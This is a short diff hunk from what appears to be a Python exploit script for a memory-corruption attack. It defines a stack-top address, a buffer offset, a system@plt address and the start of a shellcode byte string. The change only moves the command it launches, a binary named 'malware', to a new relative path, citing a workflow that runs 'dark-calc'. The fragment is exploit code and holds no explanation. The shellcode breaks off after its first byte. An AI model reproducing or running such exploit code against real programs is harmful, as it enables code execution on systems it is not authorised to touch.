@@ -5,7 +5,8 @@ import sys
 
 STACK_TOP = 0x721000801000
 BUFFER = STACK_TOP - 0x30
-COMMAND = b"./attack/malware"
+# The workflow runs dark-calc from inside attack/.
+COMMAND = b"./malware"
 SYSTEM_PLT = 0x4017e0
 SHELLCODE = (
     b"\xb8"
